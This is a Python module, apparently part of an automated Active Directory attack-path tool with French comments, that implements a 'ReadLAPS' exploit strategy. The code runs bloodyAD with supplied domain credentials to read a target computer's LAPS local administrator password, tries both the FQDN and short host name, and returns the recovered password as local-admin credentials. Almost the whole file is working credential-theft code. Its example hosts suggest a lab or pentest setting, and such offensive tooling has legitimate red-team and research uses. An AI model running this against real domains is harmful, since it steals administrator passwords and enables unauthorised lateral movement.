import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class ReadLAPSStrategy(ExploitStrategy):
    """
    ReadLAPSPassword — Le compte source a le droit de lire
    ms-Mcs-AdmPwd sur la machine cible.
    Outil : bloodyAD
    """

    def describe(self, edge: Edge) -> str:
        return (
            f"[ReadLAPS] {edge.source_node.label} peut lire le mot de passe "
            f"administrateur local LAPS de {edge.goal_node.label}"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
        # FIX: on accepte le FQDN complet, mais on garde aussi le nom court en fallback
        computer_fqdn  = edge.goal_node.label                   # ex: KINGSLANDING.SEVENKINGDOMS.LOCAL
        computer_short = computer_fqdn.split(".")[0]            # ex: KINGSLANDING

        for computer in [computer_fqdn, computer_short]:
            result = self._run_bloodyad(username, password, domain, dc_ip, computer)
            if result["success"]:
                return result

        return result  # retourne le dernier échec

    # ── helpers ──────────────────────────────────────────────────────────────

    def _run_bloodyad(self, username, password, domain, dc_ip, computer) -> dict:
        cmd = [
            "bloodyAD",
            "--host", dc_ip,
            "-d", domain,
            "-u", username,
            "-p", password,
            "get", "object", computer,
            "--attr", "ms-Mcs-AdmPwd",
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            output = result.stdout + result.stderr

            laps_password = None
            for line in output.splitlines():
                if "ms-Mcs-AdmPwd" in line and ":" in line:
                    laps_password = line.split(":", 1)[1].strip()
                    break

            if laps_password:
                return {
                    "success": True,
                    "output": output,
                    "credentials": {
                        "type":     "local_admin",
                        "target":   computer,
                        "username": "Administrator",
                        "password": laps_password,
                    },
                }
            return {"success": False, "output": output, "credentials": None}

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "bloodyAD introuvable. pip install bloodyAD", "credentials": None}